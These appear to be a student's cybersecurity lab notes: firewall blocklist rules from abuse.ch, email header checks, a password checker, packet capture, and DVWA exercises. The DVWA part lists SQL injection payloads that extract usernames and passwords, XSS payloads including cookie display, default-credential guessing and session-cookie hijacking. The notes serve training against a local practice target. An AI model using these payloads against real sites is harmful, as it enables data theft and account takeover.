TASK 1
For Inbound rules
open windows defender firewall advanced security->inbound rules->right side new rule
->custom next->all programs next->default next->remote ip->choose these ip
->add ip->ok->block->next->domain,public,private->next->finish
check in inbound rules then ip appear with blocked symbol

For Outbound rules
rules.py
import requests, csv, subprocess
# source: Abuse CH
response = requests.get(
    "https://feodotracker.abuse.ch/downloads/ipblocklist.csv"
).text
rule = 'netsh advfirewall firewall delete rule name="BadIP"'
subprocess.run(["PowerShell", "-Command", rule])
mycsv = csv.reader(
    filter(lambda x: not x.startswith("#"), response.splitlines())
)
for row in mycsv:
    ip = row[1]
    if ip != "dst_ip":
        print("Added Rule to block:", ip)
        rule = "netsh advfirewall firewall add rule name='BadIP' Dir=Out Action=Block RemoteIP=" + ip
        subprocess.run(["PowerShell", "-Command", rule])
        rule = "netsh advfirewall firewall add rule name='BadIP' Dir=Out Action=Block RemoteIP=" + ip         
        subprocess.run(["PowerShell", "-Command", rule])

In cmd run as administrator give -> python "path of rules.py"
check outbound rules, IPs will be blocked as badIp
----------------------------------------------------------
TASK 2.1
Open your email account
Open any email from your account->click 3 dots
->show original->download original
Open EML analyzer and upload the file
->In header session in from column copy the URL
Open VirusTotal->paste the URL in search bar
Output: if 0 then no malware 1 then malware
----------------------------------------------------- 
TASK 2.2
Password checking
password.py

import re
def check_password_strength(password):
    if len(password) < 8:
        return "Weak: Password must be at least 8 characters long."
    if not any(char.isdigit() for char in password):
        return "Weak: Password must include at least one number."
    if not any(char.isupper() for char in password):
        return "Weak: Password must include at least one uppercase letter."
    if not any(char.islower() for char in password):
        return "Weak: Password must include at least one lowercase letter."
    if not re.search(r'[!@#$%^&*(),.?":{}|<>]', password):
        return "Medium: Add special characters to make your password stronger."
    return "Strong: Your password is secure!"
def password_checker():
    print("Welcome to the Password Strength Checker!")
    while True:
        password = input("\nEnter your password (or type 'exit' to quit): ")
        if password.lower() == "exit":
            print("Thank you for using the Password Strength Checker! Goodbye!")
            break
        result = check_password_strength(password)
        print(result)
if __name__ == "__main__":
    password_checker()

In cmd ->python "path of password.py"
----------------------------------------------------------------
TASK 3
for packet analysis and network sniffing
open kali Linux
Terminal 1: python3 -m http.server 8080
Terminal 2: sudo tcpdump -i any -w capture.pcap port 8080
Open http://localhost:8080
Go back to terminal 2 and do ctrl+c
Open FileManager->click on capture.pcap file
Wireshark will be opened
search for http.request.method=="GET" and click on any http network appeared
it will show binary formats of network
---------------------------------------------------------
OPEN DVWA IN KALI LINUX AS
Open terminal in Linux
->sudo apt install dvwa –y
->sudo service apache2 start 
->sudo service mysql start
Open firefox and give 127.0.0.1/DVWA
------------------------------------------ 
TASK 4
Open docker
Open cmd, run docker run --rm -it -p 80:80 vulnerables/web -dvwa
open chrome and search localhost
login to dvwa website with admin and password
create/reset database
Relogin
security=low
Choose SQL injection and give commands
1 (display user details) 
1' OR '1'='1 (auth bypass)
1' ORDER BY 1-- - 
1' ORDER BY 2-- - 
1' ORDER BY 3-- - (no. of cols)
1' UNION SELECT 1,2-- - (union based inj)
1' UNION SELECT database(),2-- - (to get db name)
1' UNION SELECT table_name,2 FROM information_schema.tables 
WHERE table_schema=database()-- - (extract table names)
1' UNION SELECT column_name,2 FROM information_schema.columns  
WHERE table_name='users'-- - (extract col names)
1' UNION SELECT user,password FROM users-- - (extract username and pass)
-------------------------------------------------------------------
TASK 5
open dvwa
create/reset db and security=low

1.Reflected XSS
<script>alert('XSS')</script> 
output: Hello, pop up(in kali linux)
______________
2.Stored XSS
Name: <h1>Hacked</h1> 
Message: <script>alert('Stored XSS')</script> 
output: hello, pop up
_______________
3.DOM XSS
In the URL bar add: #<script>alert('DOM XSS')</script> 
enter then output: popup
______________
4.Capture Cookie (Lab Demo) 
In Stored XSS Message box: 
<script>alert(document.cookie)</script> 
output: popup with cookieId
---------------------------------------------------------------
TASK 6
*Authentication*
open dvwa
choose brute force attack
->user:admin
  pass:admin
->user:admin
  pass:admin123
->user:admin
  pass:password

*Session Hijacking*
Login into DVWA 
->right click->inspect->application->cookies->copy sessionID
Open edge
->right click->iinspect->application->cookies->paste sessionID
In edge url remove login.php and give index.php
Output: login page will appear in edge

*session Hijacking in kali linux*
Login into DVWA
->right click->inspect->storage->cookies->copy sessionID
Open private window
->right cick->inspect->storage->cookies->paste sessionID

*session fixation*
Login to DVWA
Set security lo high
->right click->inspect->application->cookies->copy sessionID
Logout and again
->right click->inspect->application->cookies->copy sessionID
output: both sessionIDs should be different
If security=low then sessionIDs are same
-------------------------------------------

